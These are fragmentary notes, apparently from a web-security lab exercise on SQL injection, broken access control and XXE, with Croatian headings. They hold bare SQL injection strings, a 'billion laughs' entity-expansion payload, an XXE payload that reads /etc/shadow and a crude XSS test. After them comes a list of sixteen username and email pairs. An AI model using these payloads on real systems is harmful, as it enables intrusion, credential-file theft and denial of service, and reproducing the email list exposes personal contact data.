https://...
SQL umetanje (SQL Injection), Loša kontrola pristupa (Broken Access Control), Vanjski XML entiteti (XML External Entity, XXE)
upute...


tower' or 0=0 union SELECT * FROM sqlite_master;--
tower' or 0=0 ;--

<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY bar "lol ">
<!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;">
<!ENTITY t2 "&t1;&t1;&t1;&t1;">
<!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<foo>
&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;
</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>

<note>
script>javascript:alert('XXE Injection');/script>
</note>

freestar rockxy@telemol.club
boyscoutscattle havenlaw@foohurfe.com 
lovesickmany holski@chillphet.com
childwarm smiruha@mobii.site
insistenthoney puzinevgenij@hasevo.com
girlfriendobliging comeculo12@yandex.cfd
hoarsegamy dacanes29@txtq.site
cardmultiple liled98e@dwraygc.com
hawseholeedition iabpionetko@txtq.site
testswamp bigdaddybean007@masjoco.com
orchidboyfriend b3b3b3@nugastore.com
currybeetroot narcisochka@yalexonyegues.com
parrelselfish adriian17@pubb.site
touriststarling alessandrabernascon@rlooa.com
cootportfolio fasg12g@axie.ml
invidiouscreature frozenium@songshnagu.com

